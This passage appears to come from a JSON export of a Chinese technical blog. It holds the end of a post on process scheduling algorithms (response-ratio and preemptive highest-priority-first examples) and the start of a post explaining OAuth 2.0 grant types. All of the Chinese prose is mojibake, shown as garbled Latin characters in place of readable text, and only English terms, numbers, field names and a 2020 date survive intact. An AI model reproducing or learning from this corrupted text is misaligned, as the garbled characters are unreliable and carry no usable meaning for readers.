å¯è§ï¼Œæ­¤æ—¶è¿›ç¨‹5å·²ç»ç­‰å¾…å¾ˆä¹…äº†ï¼Œéœ€è¦è®©å®ƒæ¥å—æœåŠ¡ã€‚\nè¿›ç¨‹5è¿è¡Œ2ç§’ï¼Œåœ¨ç¬¬6ç§’çš„æ—¶é—´ç»“æŸï¼Œæ­¤æ—¶è¿˜æœ‰è¿›ç¨‹2/3åœ¨ç­‰å¾…ï¼Œè®¡ç®—å®ƒä»¬çš„å“åº”æ¯”ï¼š\nç¬¬å…­ç§’å“åº”æ¯” å¯è§ï¼Œè¿›ç¨‹2çš„å“åº”æ¯”è¿˜æ˜¯é«˜ä¸€äº›ï¼Œè®©å®ƒæ¥å—æœåŠ¡ã€‚\nåœ¨ç¬¬12ç§’çš„æ—¶å€™è¿›ç¨‹2ç»“æŸï¼Œæ­¤æ—¶è¿›ç¨‹3å’Œè¿›ç¨‹4åœ¨ç­‰å¾…ï¼Œè®¡ç®—å®ƒä»¬çš„å“åº”æ¯”ï¼š\nç¬¬åäºŒç§’å“åº”æ¯” æ­¤æ—¶è®©è¿›ç¨‹3æ¥å—æœåŠ¡ï¼Œåœ¨ç¬¬22ç§’çš„æ—¶å€™ç»“æŸï¼Œè¿›ç¨‹4è¿›å…¥ï¼Œåœ¨ç¬¬30ç§’çš„æ—¶å€™ç»“æŸã€‚\nè€è§„çŸ©ï¼Œè®¡ç®—æ•°å€¼ï¼š\næ–°æ•°æ® ç›¸æ¯”äºSJFç®—æ³•ï¼Œè¿™ä¸ªç®—æ³•ä½¿å¾—é•¿è¿›ç¨‹3å…äºé¥¥é¥¿ï¼Œæ˜¯ä¸€ä¸ªæ¯”è¾ƒæš–å¿ƒçš„åšæ³•ã€‚\nè¿™ä¸ªç®—æ³•å”¯ä¸€çš„é—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬éœ€è¦æ¯æ—¶æ¯åˆ»åœ°è®¡ç®—å„ä¸ªè¿›ç¨‹çš„å“åº”æ¯”ï¼ŒåŒæ—¶éœ€è¦æŠŠå®ƒä»¬çš„å“åº”æ¯”å­˜å…¥å†…å­˜çš„æŸä¸ªç©ºé—´ä¸­ï¼›å¢åŠ äº†è®¡ç®—ï¼Œå¢åŠ äº†å¼€é”€ã€‚\næœ€é«˜ä¼˜å…ˆæ•°ä¼˜å…ˆï¼ˆHighest Priority Firstï¼ŒHPFï¼‰ æœ€é«˜ä¼˜å…ˆæ•°ä¼˜å…ˆç®—æ³•ä¸å…³æ³¨è¿›ç¨‹çš„å„ç§æ—¶é—´ï¼Œè€Œæ ¹æ®è¿›ç¨‹çš„**ä¼˜å…ˆæ•°ï¼ˆåˆç§°ä¼˜å…ˆçº§ï¼‰**è¿›è¡Œè°ƒåº¦ã€‚è¿™ä¸ªç®—æ³•è¦æ±‚æ¯ä¸ªè¿›ç¨‹éƒ½è¦å…·å¤‡ä¸€ä¸ªä¼˜å…ˆçº§ï¼Œè¿™ä¸ªä¼˜å…ˆçº§å¯ä»¥æ˜¯é™æ€çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯åŠ¨æ€çš„ã€‚é™æ€ä¼˜å…ˆçº§åœ¨è¿›ç¨‹åˆ›å»ºçš„æ—¶å€™åˆ†é…ï¼Œåœ¨è¿›ç¨‹ç”Ÿå­˜å‘¨æœŸå†…ä¿æŒä¸å˜ï¼›åŠ¨æ€ä¼˜å…ˆçº§å…è®¸åœ¨è¿›ç¨‹ç”Ÿå­˜æœŸå†…è¢«ä¿®æ”¹ã€‚\nå®é™…ä¸Šï¼Œä¹‹å‰çš„å‡ ç§ç®—æ³•å¯ä»¥çœ‹åšæ˜¯è¿™ä¸ªç®—æ³•çš„ç‰¹ä¾‹ï¼šæ¯”å¦‚çŸ­ä½œä¸šä¼˜å…ˆç®—æ³•ï¼Œè¿›ç¨‹çš„ä¼˜å…ˆçº§å¯ä»¥çœ‹æˆæ˜¯ä¸è¿è¡Œæ—¶é—´æˆåæ¯”çš„ä¸€ä¸ªæ•°ï¼Œå³è¿›ç¨‹è¿è¡Œæ—¶é—´è¶ŠçŸ­ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼Œå› è€Œè¶ŠçŸ­çš„è¿›ç¨‹è¶Šå…ˆå¾—åˆ°è°ƒåº¦ã€‚\nåœ¨è¿™ä¸ªç®—æ³•ä¸­ï¼Œæˆ‘ä»¬è¦å¼•å…¥ä¸¤ä¸ªæ¦‚å¿µï¼šå‰¥å¤ºå’Œéå‰¥å¤ºï¼ˆåˆç§°æŠ¢å å’ŒéæŠ¢å ï¼‰ã€‚\n*å‰¥å¤ºï¼ˆæŠ¢å ï¼‰*æŒ‡çš„æ˜¯åœ¨ä¸€ä¸ªè¿›ç¨‹åˆ°è¾¾çš„æ—¶å€™ï¼Œè‹¥å½“å‰è¿è¡Œçš„è¿›ç¨‹ä¼˜å…ˆçº§å°äºè‡ªå·±ï¼Œåˆ™å®ƒå¯ä»¥æŠ¢å å½“å‰è¿›ç¨‹çš„CPUï¼Œè€Œè¢«æŠ¢å çš„è¿›ç¨‹å°±ä¼šè¿›å…¥å°±ç»ªé˜Ÿåˆ—ï¼Œç­‰å¾…ä¸‹ä¸€è½®è°ƒåº¦ã€‚\n*éå‰¥å¤ºï¼ˆéæŠ¢å ï¼‰*çš„è°ƒåº¦æ–¹å¼å°±æ˜¯æŒ‡æ— è®ºåˆ°è¾¾çš„è¿›ç¨‹ä¼˜å…ˆçº§å¤šé«˜ï¼Œéƒ½è¦ç­‰å¾…å½“å‰è¿›ç¨‹è¿è¡Œå®Œæˆï¼ˆæˆ–è€…åˆ†é…ç»™å®ƒçš„æ—¶é—´ç”¨å®Œï¼‰ï¼Œæ‰èƒ½è¿›å…¥è°ƒåº¦ã€‚\nä»¥çœ‹ç—…ä¸ºä¾‹ï¼ŒæŠ¢å çš„çœ‹ç—…æ–¹å¼å°±æ˜¯ä½ æ­£åœ¨è¢«åŒ»ç”Ÿè¯Šæ–­ï¼Œæ­¤æ—¶çªç„¶æ¥äº†æ€¥è¯Šï¼ŒåŒ»ç”Ÿå°±æŠŠä½ æ‰”ä¸‹ï¼Œå…ˆå»æŠ¢æ•‘ä¼¤å‘˜äº†ï¼›è€ŒéæŠ¢å çš„æ–¹å¼å°±æ˜¯åŒ»ç”Ÿä¸€å®šè¦æŠŠä½ è¯Šæ–­å®Œæˆï¼Œå†å»æŠ¢æ•‘ä¼¤å‘˜ã€‚\nä¾‹å­å¬èµ·æ¥æ¯”è¾ƒç¦»è°±ã€‚è¿™ä¸¤ç§æ–¹å¼å®é™…ä¸Šå„æœ‰ä¼˜ç‚¹ï¼Œè¯»è€…å¯ä»¥è‡ªè¡Œä½“ä¼šã€‚\nå›åˆ°æ­£é¢˜ï¼Œæˆ‘ä»¬å…ˆè€ƒè™‘æŠ¢å æ–¹å¼ä¸‹çš„HPFç®—æ³•ï¼Œé¦–å…ˆä¸ºä¸Šé¢çš„ä¾‹å­ä¸­çš„å‡ ä¸ªè¿›ç¨‹å¼•å…¥ä¼˜å…ˆçº§ï¼š\næ–°ä¾‹å­ åœ¨ç¬¬0ç§’çš„æ—¶å€™ï¼Œè¿›ç¨‹1åˆ°è¾¾ï¼Œå¼€å§‹ä¸ºå…¶æœåŠ¡ï¼›\nåœ¨ç¬¬1ç§’çš„æ—¶å€™ï¼Œè¿›ç¨‹5åˆ°è¾¾ï¼Œç”±äºè¿›ç¨‹5çš„ä¼˜å…ˆçº§é«˜äºè¿›ç¨‹1ï¼Œæ­¤æ—¶å°†æš‚åœè¿›ç¨‹1çš„æœåŠ¡ï¼Œè½¬ä¸ºæœåŠ¡è¿›ç¨‹5ï¼Œè®°ä½æ­¤æ—¶è¿›ç¨‹1è¿˜éœ€è¦è¿è¡Œ3ç§’çš„æ—¶é—´ï¼›\nåœ¨ç¬¬2ç§’çš„æ—¶å€™ï¼Œè¿›ç¨‹3åˆ°è¾¾ï¼Œç”±äºè¿›ç¨‹3çš„ä¼˜å…ˆçº§ä½äºè¿›ç¨‹5ï¼ŒCPUç»§ç»­æœåŠ¡è¿›ç¨‹5ï¼›\nåœ¨ç¬¬3ç§’çš„æ—¶å€™ï¼Œè¿›ç¨‹5è¿è¡Œç»“æŸï¼Œæ­¤æ—¶è¿›ç¨‹2åˆ°è¾¾ï¼Œç°åœ¨ç­‰å¾…çš„è¿›ç¨‹æœ‰1/2/3ï¼Œç”±äºè¿›ç¨‹2çš„ä¼˜å…ˆçº§æœ€é«˜ï¼Œç³»ç»Ÿä¸ºå…¶æœåŠ¡ï¼›\nåœ¨ç¬¬7ç§’çš„æ—¶å€™è¿›ç¨‹4åˆ°è¾¾ï¼Œä¸ä¼šæ‰“æ–­è¿›ç¨‹2ï¼›\nåœ¨ç¬¬9ç§’çš„æ—¶å€™ï¼Œè¿›ç¨‹2ç»“æŸï¼Œæ­¤æ—¶ç­‰å¾…çš„è¿›ç¨‹æœ‰1/3/4ï¼Œç”±äºè¿›ç¨‹3çš„ä¼˜å…ˆçº§æœ€é«˜ï¼Œç³»ç»Ÿä¸ºå…¶æœåŠ¡ï¼›\nåœ¨ç¬¬19ç§’çš„æ—¶å€™ï¼Œè¿›ç¨‹3ç»“æŸï¼Œæ­¤æ—¶ç­‰å¾…çš„è¿›ç¨‹æœ‰1/4ï¼Œç”±äºè¿›ç¨‹4çš„ä¼˜å…ˆçº§æ›´é«˜ï¼Œç³»ç»Ÿä¸ºå…¶æœåŠ¡ï¼›\nåœ¨ç¬¬27ç§’çš„æ—¶å€™ï¼Œè¿›ç¨‹4ç»“æŸï¼Œæ­¤æ—¶ä¸ºè¿›ç¨‹1æœåŠ¡ï¼Œå®Œæˆå‰©ä¸‹çš„3ç§’æ—¶é—´ï¼Œåœ¨ç¬¬30ç§’ç»“æŸã€‚\næŠ¢å å¼HPF åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¿›ç¨‹1æœ€å…ˆåˆ°è¾¾ï¼Œæœ€æ™šç»“æŸï¼Œç®€ç›´æƒ¨å…®å…®ï¼›ä½†æ˜¯æˆ‘ä»¬é¦–æ¬¡çœ‹åˆ°äº†ä¸¤ä¸ªå¸¦æƒå‘¨è½¬æ—¶é—´ä¸º1çš„æƒ…å†µï¼Œè¡¨æ˜è¿™ä¸ªè°ƒåº¦æ–¹å¼åœ¨ä¼˜å…ˆçº§è®¾ç½®åˆç†çš„æ¡ä»¶ä¸‹ï¼Œæ•ˆç‡è¿˜æ˜¯ä¸é”™çš„ã€‚\nå¯¹äºéæŠ¢å å¼è°ƒåº¦ï¼Œä¸Šé¢ä¸‰ä¸ªå°èŠ‚å·²ç»è®²äº†å¤ªå¤šï¼Œåœ¨æ­¤ä¸åŠ èµ˜è¿°ã€‚\nå°ç»“ æœ¬æ–‡ä»‹ç»äº†å››ç§è°ƒåº¦ç®—æ³•ï¼Œå¹¶ä»¥å‡ ä¸ªç®€å•çš„ä¾‹å­å…·ä½“æ¨¡æ‹Ÿäº†å®ƒä»¬çš„è¿è¡Œæ¨¡å¼ã€‚æœ¬æ¥è¿˜å¸Œæœ›é™„ä¸Šè¿™å‡ ä¸ªç®—æ³•çš„ä»£ç å®ç°ï¼Œä½†ç¯‡å¹…æœ‰é™ï¼Œåªå¥½æ–°å¼€ä¸€ç¯‡ã€‚\nå¦‚æœä½ è®¤ä¸ºæˆ‘æœ‰å“ªäº›åœ°æ–¹æ²¡æœ‰è®²æ¸…æ¥šï¼Œæˆ–è€…æœ‰å“ªäº›é”™è¯¯ä¹‹å¤„ï¼Œæ¬¢è¿è¯„è®ºåŒºç•™è¨€å‘Šè¯‰æˆ‘ã€‚(ãƒï¿£â–½ï¿£)\n","date":"2020-10-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/","title":"ä¸€äº›ç®€å•çš„è¿›ç¨‹è°ƒåº¦ç®—æ³•"},{"content":"æœ¬æ–‡å°†ä»‹ç»å¼€æ”¾æˆæƒåè®®çš„æ¦‚å¿µï¼ŒOAuthåè®®è§£å†³çš„é—®é¢˜ä»¥åŠOAuthåè®®çš„è®¾è®¡æ–¹æ¡ˆä¸åº”ç”¨æƒ…å†µã€‚\n1. èƒŒæ™¯ åœ¨ç”Ÿæ´»ä¸­ï¼Œæˆ‘ä»¬æ¥è§¦çš„å„ç§ç½‘ç»œæœåŠ¡é€šå¸¸éœ€è¦ä½¿ç”¨æˆ‘ä»¬çš„ä¸ªäººèµ„æºã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬ä½¿ç”¨ç½‘æ˜“äº‘éŸ³ä¹ï¼Œä½†æ˜¯é€‰æ‹©QQç™»å½•ï¼Œè¿™æ—¶ç½‘æ˜“äº‘éœ€è¦è·å–æˆ‘ä»¬çš„QQè´¦å·ä¿¡æ¯ï¼Œå¦‚æœåŒæ–¹ä¹‹é—´æ²¡æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„æˆæƒæœºåˆ¶ï¼Œå°±ä¼šå¯¹æˆ‘ä»¬çš„éšç§å®‰å…¨é€ æˆå¨èƒã€‚è¯•æƒ³ï¼šç½‘æ˜“äº‘éŸ³ä¹å¦‚ä½•è·å–æˆ‘ä»¬çš„QQè´¦å·ä¿¡æ¯å‘¢ï¼Ÿæ— éæ˜¯è®©æˆ‘ä»¬ç»™å‡ºæˆ‘ä»¬çš„è´¦å·å¯†ç å§ã€‚ä½†æ˜¯è¿™æ ·åšæœ‰å¦‚ä¸‹ä¸¥é‡çš„ç¼ºç‚¹ï¼š\næˆ‘ä»¬éœ€è¦æŠŠQQè´¦å·å¯†ç å‘Šè¯‰ç½‘æ˜“äº‘éŸ³ä¹ï¼Œå¢åŠ äº†æ³„éœ²çš„é£é™©ï¼› ç½‘æ˜“äº‘éŸ³ä¹æ‹¥æœ‰äº†å¯¹ä½ çš„QQè´¦å·çš„æ“ä½œæƒé™â€”â€”æƒ³æƒ³éƒ½å¤´çš®å‘éº»ï¼› éœ€è¦æ”¶å›ç½‘æ˜“äº‘éŸ³ä¹å¯¹QQçš„è®¿é—®æƒé™æ—¶ï¼Œåªèƒ½é€šè¿‡ä¿®æ”¹å¯†ç çš„æ–¹å¼ï¼Œä½†æ˜¯è¿™æ ·åšä¼šä½¿å…¶ä»–ä½¿ç”¨åŒæ ·æ–¹å¼è®¿é—®QQçš„åº”ç”¨å…¨éƒ¨å¤±æ•ˆã€‚ åŸºäºæ­¤ï¼Œå¼€æ”¾æˆæƒï¼ˆOpen Authorizationï¼‰å¸Œæœ›èƒ½å¤Ÿä½¿å¾—ç¬¬ä¸‰æ–¹æ— éœ€çŸ¥é“ç”¨æˆ·çš„è´¦å·åŠå¯†ç ï¼Œå°±å¯ä»¥è·å–ç”¨æˆ·çš„æˆæƒä¿¡æ¯ã€‚\nå¦‚æœæ˜¯ä½ ï¼Œä½ ä¼šæ€ä¹ˆå®ç°å®ƒï¼Ÿ\n2. è®¾è®¡æ–¹æ¡ˆ OAuth2.0ä¸»è¦æ¶‰åŠå››ç§è§’è‰²ï¼Œåˆ†åˆ«æ˜¯ï¼š\nç”¨æˆ·ï¼Œå³èµ„æºæ‰€æœ‰è€…ã€‚ èµ„æºæœåŠ¡å™¨ï¼Œå³æœåŠ¡æä¾›å•†ã€‚ç”¨æ¥å­˜æ”¾å—ä¿æŠ¤çš„ç”¨æˆ·èµ„æºã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œèµ„æºæœåŠ¡å™¨å°±æ˜¯QQæœåŠ¡å™¨ã€‚ å®¢æˆ·ç«¯ï¼Œå‘èµ„æºæœåŠ¡å™¨è¿›è¡Œèµ„æºè¯·æ±‚çš„ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå®¢æˆ·ç«¯å°±æ˜¯ç½‘æ˜“äº‘éŸ³ä¹æœåŠ¡å™¨ã€‚ è®¤è¯æœåŠ¡å™¨ï¼Œåœ¨éªŒè¯èµ„æºæ‰€æœ‰è€…å¹¶å–å¾—æ‰€æœ‰è€…çš„æˆæƒåï¼Œå°†è®¿é—®ä»¤ç‰Œå‘ç»™å®¢æˆ·ç«¯ã€‚å½“æˆ‘ä»¬æƒ³ä½¿ç”¨QQç™»å½•ç½‘æ˜“äº‘éŸ³ä¹ï¼Œé¦–å…ˆå°±æ˜¯è¦è¯æ˜æˆ‘ä»¬çš„å·ä¸»èº«ä»½ï¼Œè¿™å°±æ˜¯è®¤è¯æœåŠ¡å™¨çš„å·¥ä½œâ€”â€”è¯æ˜èº«ä»½ã€å–å¾—æˆæƒã€å…è®¸ç¬¬ä¸‰æ–¹è®¿é—®ã€‚ æ˜¾ç„¶ï¼Œèµ„æºæœåŠ¡å’Œè®¤è¯æœåŠ¡çš„æä¾›è€…éƒ½æ˜¯QQï¼Œå› æ­¤å®ƒä»¬å¯ä»¥è¿è¡Œåœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šã€‚\nOAuth2.0 å°±æ˜¯åœ¨è¿™å››ä¸ªè§’è‰²çš„åŸºç¡€ä¸Šï¼Œè®¾è®¡äº†å››ç§æˆæƒæ¨¡å¼ï¼šæˆæƒç ï¼ˆAuthorization Codeï¼‰æ¨¡å¼ã€ç®€åŒ–æ¨¡å¼ã€å¯†ç æ¨¡å¼å’Œå®¢æˆ·ç«¯æ¨¡å¼ã€‚ä¸‹é¢å°±é‡ç‚¹ä¸€èµ·çœ‹ä¸€ä¸‹æˆæƒç æ¨¡å¼çš„å·¥ä½œæµç¨‹ã€‚\n3. æˆæƒç æ¨¡å¼ æˆæƒç æ˜¯è®¤è¯æœåŠ¡å™¨æä¾›çš„ä¸€ä¸²åºåˆ—ï¼Œå®¢æˆ·ç«¯å¯ä»¥å‡­å€Ÿæˆæƒç å‘è®¤è¯æœåŠ¡å™¨ç´¢è¦è®¿é—®ä»¤ç‰Œï¼ˆAccess Tokenï¼‰ï¼Œè¿›è€Œå®ç°ç›¸åº”èµ„æºçš„è®¿é—®ã€‚æ²¡çœ‹æ‡‚ï¼Ÿä¸¾ä¸ªä¾‹å­â€”â€”\nè¿˜æ˜¯ä½¿ç”¨QQæˆæƒç™»å½•ç½‘æ˜“äº‘éŸ³ä¹ï¼Œæˆ‘ä»¬éœ€è¦ç»å†å¦‚ä¸‹çš„æµç¨‹ï¼š\næ‰“å¼€ç½‘æ˜“äº‘éŸ³ä¹ï¼Œç‚¹å‡»â€œä½¿ç”¨QQç™»å½•â€ï¼› ç½‘æ˜“äº‘éŸ³ä¹è·Ÿæˆ‘ä»¬è¯´ï¼šæƒ³ä½¿ç”¨QQç™»å½•ï¼Ÿè¡Œï¼Œä½†æ˜¯æˆ‘ç°åœ¨æ²¡æœ‰è®¿é—®QQè´¦å·çš„æƒé™ï¼Œç»™ä½ å¼ çº¸æ¡ï¼Œä¸Šé¢å†™äº†æˆ‘è¦è®¿é—®ä½ è´¦å·å“ªäº›ä¿¡æ¯ï¼Œä½ å»æ‰¾QQè®©ä»–åŒæ„æˆ‘è®¿é—®ï¼› äºæ˜¯æˆ‘ä»¬æ¥åˆ°QQè®¤è¯ç•Œé¢ã€‚QQé¦–å…ˆè¦æˆ‘ä»¬ç™»å½•è´¦å·ï¼Œç„¶åè·Ÿæˆ‘ä»¬è¯´ï¼šç½‘æ˜“äº‘éŸ³ä¹æƒ³è¦ä½ çš„æ˜µç§°ä¿¡æ¯ã€å¤´åƒä¿¡æ¯ç­‰ç­‰ç­‰ç­‰ï¼Œä½ åŒæ„ä¸ï¼Ÿ æˆ‘ä»¬é€‰æ‹©åŒæ„ã€‚äºæ˜¯QQç»™äº†æˆ‘ä»¬ä¸€å¼ çº¸æ¡ï¼Œè·Ÿæˆ‘ä»¬è¯´ï¼šè¿™ä¸ªçº¸æ¡ä¸Šå†™äº†è®¿é—®ä½ æ˜µç§°å¤´åƒä¿¡æ¯çš„æˆæƒç ï¼Œä½ æ‹¿å»ç»™ç½‘æ˜“äº‘éŸ³ä¹ï¼Œä»–æ‹¿ç€è¿™ä¸ªæ¡å­æ¥æ‰¾æˆ‘ï¼Œæˆ‘å°±è®©ä»–è®¿é—®ï¼› äºæ˜¯æˆ‘ä»¬æŠŠå†™ç€æˆæƒç çš„æ¡å­ç»™äº†ç½‘æ˜“äº‘éŸ³ä¹ï¼Œä»–æ‹¿ç€è¿™ä¸ªæ¡å­å»æ‰¾QQäº†ï¼ŒQQçš„è®¤è¯æœåŠ¡å™¨æ ¹æ®è¿™å¼ æ¡å­ç»™ç½‘æ˜“äº‘éŸ³ä¹å¼€å‡ºäº†ä¸€ä¸ªè®¿é—®ä»¤ç‰Œï¼ˆAccess Tokenï¼‰ï¼Œç½‘æ˜“äº‘æ‹¿åˆ°äº†è¿™å¼ ä»¤ç‰Œï¼Œå¹¶å‡­å€Ÿå®ƒæˆåŠŸè®¿é—®äº†æˆ‘ä»¬çš„QQè´¦å·ä¿¡æ¯ã€‚ ç½‘æ˜“äº‘éŸ³ä¹æ‹¿åˆ°è¿™ä¸ªè´¦å·ä¿¡æ¯ï¼Œåœ¨è‡ªå·±æ•°æ®åº“é‡Œé¢ä¸€æŸ¥ï¼Œå‘ç°è¿™ä¸ªQQè´¦å·å·²ç»è·ŸæŸä¸ªç½‘æ˜“äº‘éŸ³ä¹è´¦å·ç»‘å®šäº†ï¼Œäºæ˜¯æˆ‘ä»¬æˆåŠŸä½¿ç”¨è‡ªå·±çš„QQè´¦å·ç™»å½•äº†ç½‘æ˜“äº‘éŸ³ä¹ã€‚ è¿™å°±æ˜¯éå¸¸å…·è±¡çš„æˆæƒç æ¨¡å¼ï¼Œæ˜¯ä¸æ˜¯éå¸¸ç®€å•ï¼Ÿ\nä½†æ˜¯ï¼Œè¿™é‡Œè¿˜æœ‰ä¸€äº›ç»†èŠ‚éœ€è¦æ€è€ƒï¼š\nQQä¼šè¯´ï¼Œæˆ‘è¿™ä¹ˆæ²¡ç‰Œé¢çš„å—ï¼Ÿè°æƒ³ä»æˆ‘è¿™è¯·æ±‚èµ„æºæˆ‘å°±ç»™ä»–ï¼Ÿ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä»ç½‘æ˜“äº‘éŸ³ä¹å»æ‰¾QQï¼Œæ‹¿åˆ°æˆæƒç ä¹‹åå›å»æ‰¾ç½‘æ˜“äº‘éŸ³ä¹ã€‚ä½†æ˜¯ï¼Œåœ¨çœŸå®çš„æµè§ˆå™¨å’ŒWebæœåŠ¡å™¨äº¤äº’çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬çš„æµè§ˆå™¨å¯æ²¡è¿™ä¹ˆèªæ˜ï¼Œæˆ‘ä»¬è¦ç»™å®ƒè§„åˆ’å¥½è·¯çº¿æ‰è¡Œã€‚ é’ˆå¯¹ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒOAuth2.0ç»™è¶³äº†èµ„æºæœåŠ¡å™¨é¢å­ï¼Œå®ƒè¦æ±‚ï¼šæ‰€æœ‰çš„å®¢æˆ·ç«¯éƒ½è¦åœ¨èµ„æºæœåŠ¡å™¨é‚£è¾¹è¿›è¡Œäº‹å…ˆçš„æ³¨å†Œï¼Œå¦åˆ™ç›´æ¥ä¸ç»™äºˆè®¿é—®çš„æƒé™ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç½‘æ˜“äº‘éŸ³ä¹äº‹å…ˆå·²ç»è·ŸQQè¯´å¥½äº†ï¼Œæ¯æ¬¡è¦è®¿é—®QQè´¦å·ä¿¡æ¯çš„æ—¶å€™éƒ½ä¼šå¸¦ä¸Šèº«ä»½è¯æ˜ï¼Œä»¥è¡¨æ˜è¿™æ˜¯ç½‘æ˜“äº‘éŸ³ä¹è¦æ¥è®¿é—®QQçš„èµ„æºäº†ã€‚å®¢æˆ·ç«¯åœ¨èµ„æºæä¾›æ–¹æ³¨å†Œçš„æ—¶å€™ï¼Œä¼šæ‹¿åˆ°èµ„æºæä¾›æ–¹ç»™å‡ºçš„ä¸€ä¸ªclient_idå’Œclient_secretï¼Œä¹‹åå°±ç”¨è¿™ä¸¤ä¸ªä¸œè¥¿è¡¨æ˜èº«ä»½ã€‚\nè€Œé’ˆå¯¹ç¬¬äºŒä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åœ¨å‘QQè¯·æ±‚æˆæƒç çš„æ—¶å€™ï¼Œéœ€è¦æä¾›redirect_uriï¼ˆæˆ–callback_uriï¼‰å­—æ®µï¼Œè¡¨æ˜æµè§ˆå™¨æ‹¿åˆ°æˆæƒç ä¹‹åè¦äº¤ç»™è°ã€‚äºæ˜¯ï¼Œæˆæƒç æ¨¡å¼çš„å®Œæ•´äº¤äº’æµç¨‹å¦‚ä¸‹ï¼š\næˆæƒç å·¥ä½œæ¨¡å¼ 4. ç®€åŒ–æ¨¡å¼ çœ‹å®Œæˆæƒç æ¨¡å¼ï¼Œå¦‚æœä½ è§‰å¾—è¿™ä¸ªæµç¨‹æœ‰ç‚¹ç¹çï¼Œé‚£ä¹ˆç®€åŒ–æ¨¡å¼å¯èƒ½ä¼šè®©ä½ å¿«ä¹ä¸€äº›ï¼š\nç®€åŒ–æ¨¡å¼ åœ¨è¿™ä¸ªæ¨¡å¼ä¸­ï¼Œå°‘æ‰äº†æˆæƒç çš„ä¼ é€’ï¼Œç›´æ¥ä¼ é€’è®¿é—®ä»¤ç‰Œï¼Œæ‰€æœ‰æ­¥éª¤åœ¨æµè§ˆå™¨ä¸­å®Œæˆï¼Œä»¤ç‰Œå¯¹è®¿é—®è€…æ˜¯å¯è§çš„ï¼Œä¸”å®¢æˆ·ç«¯ä¸éœ€è¦è®¤è¯ã€‚\nè¿™æ ·çš„æ¨¡å¼å¯¹ä¸€äº›çº¯å‰ç«¯çš„ç½‘ç»œæœåŠ¡æ¯”è¾ƒå‹å¥½ï¼Œå› ä¸ºå®ƒä¸éœ€è¦èµ„æºè¯·æ±‚è€…ä¸èµ„æºæä¾›è€…è¿›è¡Œè®¤è¯äº¤äº’ï¼Œç›´æ¥æ‹¿ç€è®¿é—®ä»¤ç‰Œæ‰¾ä¸Šé—¨å°±å¥½äº†ã€‚\nä½†æ˜¯å®ƒå«ç®€åŒ–æ¨¡å¼ï¼Œå°±æ˜¯å› ä¸ºå®ƒå­˜åœ¨å®‰å…¨é—®é¢˜ã€‚è¯•æƒ³ï¼šé‡è¦çš„è®¿é—®ä»¤ç‰Œå°±è¿™æ ·åœ¨æµè§ˆå™¨å’Œèµ„æºæä¾›æ–¹ä¹‹é—´ä¼ é€’ï¼Œå‡è®¾æ”»å‡»è€…æˆªè·äº†è®¿é—®ä»¤ç‰Œï¼Œå°±èƒ½å¤Ÿè·å–åˆ°ä½ çš„èµ„æºã€‚\n5. å¯†ç æ¨¡å¼ åœ¨å¯†ç æ¨¡å¼ä¸­ï¼Œç”¨æˆ·å‘å®¢æˆ·ç«¯æä¾›è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ã€‚å®¢æˆ·ç«¯ä½¿ç”¨è¿™äº›ä¿¡æ¯å‘èµ„æºæœåŠ¡å™¨ç´¢è¦æˆæƒã€‚è¿™å°±æ˜¯æˆ‘ä»¬å¼€å¤´è®²è¿‡çš„æ¨¡å¼ï¼Œå®ƒè¦æ±‚ç”¨æˆ·æä¾›è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä½†æ˜¯å®¢æˆ·ç«¯ä¸å¾—å­˜å‚¨è¿™äº›ä¿¡æ¯ã€‚æ˜¾ç„¶è¯¥æ¨¡å¼å»ºç«‹åœ¨ç”¨æˆ·å¯¹å®¢æˆ·ç«¯çš„é«˜åº¦ä¿¡ä»»ä¸Šï¼Œé€šå¸¸è¿™é‡Œçš„å®¢æˆ·ç«¯å±äºæ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼Œæˆ–è€…ç”±è‘—åçš„å…¬å¸å‡ºå“ã€‚è€Œè®¤è¯æœåŠ¡å™¨åªæœ‰åœ¨å…¶ä»–æˆæƒæ¨¡å¼æ— æ³•æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œæ‰è€ƒè™‘ä½¿ç”¨è¿™ç§æ¨¡å¼ã€‚\n6. å®¢æˆ·ç«¯æ¨¡å¼ å®¢æˆ·ç«¯ä»¥è‡ªå·±çš„åä¹‰ï¼Œè€Œä¸æ˜¯ç”¨æˆ·çš„åä¹‰ï¼Œå‘æœåŠ¡æä¾›å•†è¿›è¡Œè®¤è¯ã€‚ä¸¥æ ¼åœ°è¯´ï¼Œè¿™ç§æ¨¡å¼å¹¶ä¸å±äºOAuthæ¡†æ¶æ‰€è¦è§£å†³çš„é—®é¢˜ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œç”¨æˆ·ç›´æ¥å‘å®¢æˆ·ç«¯æ³¨å†Œï¼Œå®¢æˆ·ç«¯ä»¥è‡ªå·±çš„åä¹‰è¦æ±‚æœåŠ¡æä¾›å•†æä¾›æœåŠ¡ï¼Œå…¶å®ä¸å­˜åœ¨æˆæƒé—®é¢˜ã€‚\nå°ç»“ OAuth2.0 åè®®ç‡å…ˆè¢«è°·æ­Œã€é›…è™ã€å¾®è½¯ã€FaceBookç­‰å…¬å¸ä½¿ç”¨ï¼Œä¸”ç›®å‰å¾—åˆ°è¾ƒå¹¿æ³›çš„æ™®åŠã€‚ä¹‹æ‰€ä»¥æ ‡æ³¨ä¸º2.0ï¼Œæ˜¯å› 